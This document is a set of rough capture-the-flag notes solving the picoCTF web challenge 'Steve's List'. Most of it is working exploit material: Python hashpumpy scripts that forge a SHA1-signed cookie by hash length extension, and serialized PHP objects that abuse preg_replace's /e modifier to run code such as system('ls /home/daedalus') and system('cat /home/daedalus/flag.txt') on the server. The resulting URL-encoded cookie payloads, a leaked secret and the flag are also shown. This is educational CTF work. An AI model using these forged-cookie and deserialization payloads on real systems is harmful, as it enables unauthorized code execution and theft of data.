**Name**: Steve's List  
**Points**: 200
**Type**: Master challenge  
**Description**:  
Section Chief Steve was super proud of the website he was writing, but he's pretty new to programming. When Daedalus Corp caught wind of this, they hacked [his site](http://steveslist.picoctf.com/). Steve still has [an old backup](https://picoctf.com/problem-static/web/steves-list/handout.zip), but they changed the secrets! They sent us a cryptic message saying they bet we couldn't read `/home/daedalus/flag.txt`. Can you go get it for us?  
**Hint**:  
Go have a look at the cookies. Steve is pretty sure he wrote a bug, and that Daedalus left the secret the same length.  
**Files**: handout.zip (contains a php project)

*****

2141b332222df459fd212440824a35e63d37ef69

custom_settings=b%253A1%253B
custom_settings_hash=28983bf51602066a652a2917211f654c415b71b6;

url-decoded: "b%3A1%3B"
twice: "b:1;"

DAEDALUS

84eb5787abec3d3501a6bb0e326086360b4b9086
28983bf51602066a652a2917211f654c415b71b6



index.php:
b%3A1%3B
2141b332222df459fd212440824a35e63d37ef69

cookies.php:
b%3A1%3B
28983bf51602066a652a2917211f654c415b71b6

sha1(AUTH_SECRETb:1;) = 28983bf51602066a652a2917211f654c415b71b6


*****
# var_dump hax.txt 

object(Post)#5 (3) {
  ["title":protected]=>
  string(22) "0wn3d by D43d4lu5 C0rp"
  ["text":protected]=>
  string(339) "OWNED OWNED OWNED OWNED OWNED OWNED SECTION CHIEF STEVE IS THE WORST[br][img]./daedalus.png[/img][br][script]alert(1);[/script][marquee]rekt[/marquee][br][br][blink]we changed your secret[/blink][br][br][marquee][blink]bet you'll never get control of this site back[/blink][/marquee][br][blink]look at this top quality tag we added[/blink]"
  ["filters":protected]=>
  array(5) {
    [0]=>
    object(Filter)#6 (2) {
      ["pattern":protected]=>
      string(29) "/\[script\](.*)\[\/script\]/i"
      ["repl":protected]=>
      string(19) "<script>\1</script>"
    }
    [1]=>
    object(Filter)#7 (2) {
      ["pattern":protected]=>
      string(32) "/\[marquee\](.*)\[\/marquee\]/iU"
      ["repl":protected]=>
      string(21) "<marquee>\1</marquee>"
    }
    [2]=>
    object(Filter)#8 (2) {
      ["pattern":protected]=>
      string(28) "/\[blink\](.*)\[\/blink\]/iU"
      ["repl":protected]=>
      string(17) "<blink>\1</blink>"
    }
    [3]=>
    object(Filter)#9 (2) {
      ["pattern":protected]=>
      string(23) "/\[img\](.*)\[\/img\]/i"
      ["repl":protected]=>
      string(14) "<img src='\1'>"
    }
    [4]=>
    object(Filter)#10 (2) {
      ["pattern":protected]=>
      string(9) "/\[br\]/i"
      ["repl":protected]=>
      string(4) "<br>"
    }
  }
}

*****
# var_dump steve.txt

object(Post)#5 (3) {
  ["title":protected]=>
  string(23) "I'm Section Chief Steve"
  ["text":protected]=>
  string(57) "I'm the best.[br]The very best.[br][img]./Steve.png[/img]"
  ["filters":protected]=>
  array(4) {
    [0]=>
    object(Filter)#6 (2) {
      ["pattern":protected]=>
      string(19) "/\[i\](.*)\[\/i\]/i"
      ["repl":protected]=>
      string(9) "<i>\1</i>"
    }
    [1]=>
    object(Filter)#7 (2) {
      ["pattern":protected]=>
      string(19) "/\[b\](.*)\[\/b\]/i"
      ["repl":protected]=>
      string(9) "<b>\1</b>"
    }
    [2]=>
    object(Filter)#8 (2) {
      ["pattern":protected]=>
      string(23) "/\[img\](.*)\[\/img\]/i"
      ["repl":protected]=>
      string(14) "<img src='\1'>"
    }
    [3]=>
    object(Filter)#9 (2) {
      ["pattern":protected]=>
      string(9) "/\[br\]/i"
      ["repl":protected]=>
      string(4) "<br>"
    }
  }
}

******

php -S 127.0.0.1:8888 -t test_php/

php -S 127.0.0.1:8888 -t steves_list_backup/


*****



######

<?php  
  require_once("classes.php");

  $myfilter = new Filter("/a/e", "file_get_contents('/root/test.txt')");
  $mypost = new Post("title", "a", array($myfilter));
  echo $mypost->display_post();
?>

string(195) "O:4:"Post":3:{s:8:"*title";s:5:"title";s:7:"*text";s:1:"a";s:10:"*filters";a:1:{i:0;O:6:"Filter":2:{s:10:"*pattern";s:4:"/a/e";s:7:"*repl";s:35:"file_get_contents('/root/test.txt')";}}}" 

Escape the double quotes + add /x00 on either side of the 5 asterisks:

O:4:\"Post\":3:{s:8:\"\x00*\x00title\";s:5:\"title\";s:7:\"\x00*\x00text\";s:1:\"a\";s:10:\"\x00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\x00*\x00pattern\";s:4:\"/a/e\";s:7:\"\x00*\x00repl\";s:35:\"file_get_contents('/root/test.txt')\";}}}

Verify that this works when unserializing locally.

######

import hashpumpy
import urllib

# Post object without filter (prints "<!-- POST title: a -->" at the bottom)
sig = "2141b332222df459fd212440824a35e63d37ef69"
data = "b:1;"
kl = 8
add = "\n" + "O:4:\"Post\":3:{s:8:\"\x00*\x00title\";s:5:\"title\";s:7:\"\x00*\x00text\";s:1:\"a\";s:10:\"\x00*\x00filters\";a:0:{}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'ccab5775f7dbbac3aff0808f1e678a149a08e70b'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A0%3A%7B%7D%7D'


# Post object with simple filter a->b (prints "<!-- POST title: b -->" at the bottom)
add = "\n" + "O:4:\"Post\":3:{s:8:\"\x00*\x00title\";s:5:\"title\";s:7:\"\x00*\x00text\";s:1:\"a\";s:10:\"\x00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\x00*\x00pattern\";s:4:\"/a/e\";s:7:\"\x00*\x00repl\";s:1:\"b\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

 c15852cee15169502158a75bf86c437e3bf7187e
'c15852cee15169502158a75bf86c437e3bf7187e'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A1%3A%22b%22%3B%7D%7D%7D'

b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A1%3A%22b%22%3B%7D%7D%7D


# Post object with complex filter (/root/test.txt); only test locally
add = "\n" + "O:4:\"Post\":3:{s:8:\"\x00*\x00title\";s:5:\"title\";s:7:\"\x00*\x00text\";s:1:\"a\";s:10:\"\x00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\x00*\x00pattern\";s:4:\"/a/e\";s:7:\"\x00*\x00repl\";s:35:\"file_get_contents('/root/test.txt')\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'ecc4ed0ae8118a4fb80c879086d6dd1731469377'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A35%3A%22file_get_contents%28%27%2Froot%2Ftest.txt%27%29%22%3B%7D%7D%7D'

# Post object with complex filter (/home/daedalus/flag.txt)
add = "\n" + "O:4:\"Post\":3:{s:8:\"\00*\x00title\";s:5:\"title\";s:7:\"\00*\x00text\";s:1:\"a\";s:10:\"\00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\00*\x00pattern\";s:4:\"/a/e\";s:7:\"\00*\x00repl\";s:44:\"file_get_contents('/home/daedalus/flag.txt')\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'af6a34f1325d5d4e611a1eca4295a1fba7b1f5c9'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A44%3A%22file_get_contents%28%27%2Fhome%2Fdaedalus%2Fflag.txt%27%29%22%3B%7D%7D%7D'

# Post object with complex filter (index.php)
add = "\n" + "O:4:\"Post\":3:{s:8:\"\00*\x00title\";s:5:\"title\";s:7:\"\00*\x00text\";s:1:\"a\";s:10:\"\00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\00*\x00pattern\";s:4:\"/a/e\";s:7:\"\00*\x00repl\";s:30:\"file_get_contents('index.php')\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'c7aca860b5608beee1705109be2d03f6804eed04'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A30%3A%22file_get_contents%28%27index.php%27%29%22%3B%7D%7D%7D'

# Post object with complex filter (system pwd)
add = "\n" + "O:4:\"Post\":3:{s:8:\"\00*\x00title\";s:5:\"title\";s:7:\"\00*\x00text\";s:1:\"a\";s:10:\"\00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\00*\x00pattern\";s:4:\"/a/e\";s:7:\"\00*\x00repl\";s:11:\"system(pwd)\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'14df21bc7fd2f277a9b1ba1225444af6dcd1e345'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A11%3A%22system%28pwd%29%22%3B%7D%7D%7D'

# Post object with complex filter (system ls)
add = "\n" + "O:4:\"Post\":3:{s:8:\"\00*\x00title\";s:5:\"title\";s:7:\"\00*\x00text\";s:1:\"a\";s:10:\"\00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\00*\x00pattern\";s:4:\"/a/e\";s:7:\"\00*\x00repl\";s:10:\"system(ls)\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'3d793481e67b34f5f08198790cd26957d083a79e'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A10%3A%22system%28ls%29%22%3B%7D%7D%7D'

# Post object with complex filter (system ls /home/daedalus)
command = "system('ls /home/daedalus')"
add = "\n" + "O:4:\"Post\":3:{s:8:\"\00*\x00title\";s:5:\"title\";s:7:\"\00*\x00text\";s:1:\"a\";s:10:\"\00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\00*\x00pattern\";s:4:\"/a/e\";s:7:\"\00*\x00repl\";s:"+str(len(command))+":\""+command+"\";}}}"
h = hashpumpy.hashpump(sig, data, add, kl)
h[0]
urllib.quote_plus(h[1])

'7ece8c86d7c432f420f51c276cce9eebcf47d92b'
'b%3A1%3B%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A5%3A%22title%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A1%3A%22a%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A4%3A%22%2Fa%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A27%3A%22system%28%27ls+%2Fhome%2Fdaedalus%27%29%22%3B%7D%7D%7D'


###
<?php
  define('STEVES_LIST_ABSOLUTE_INCLUDE_ROOT', dirname(__FILE__) . "/");
  define('STEVES_LIST_TEMPLATES_PATH', dirname(__FILE__) . "/templates/");
  define('DISPLAY_POSTS', 0);
  // Daedalus changed this... I guess AAAAAAAA was not a good secret :(
  define('AUTH_SECRET', "\xb9\xffCV\xa2v\xe9\xa1");
  require_once(STEVES_LIST_ABSOLUTE_INCLUDE_ROOT . "includes/classes.php");
?>
###

Made a little script that automates the sending of commands:

import send_command
s = send_command.send
print s("system('cat /home/daedalus/flag.txt')")
print s("system('cat /var/www/html/cookies.php')")



FLAG: D43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve



Note: replaced ' by \' in add

#####

# References:
- hash length extension attack
- hashpump/hashpumpy
- [PHP preg_replace vulnerability](http://www.madirish.net/402)
- http://php.net/manual/en/reference.pcre.pattern.syntax.php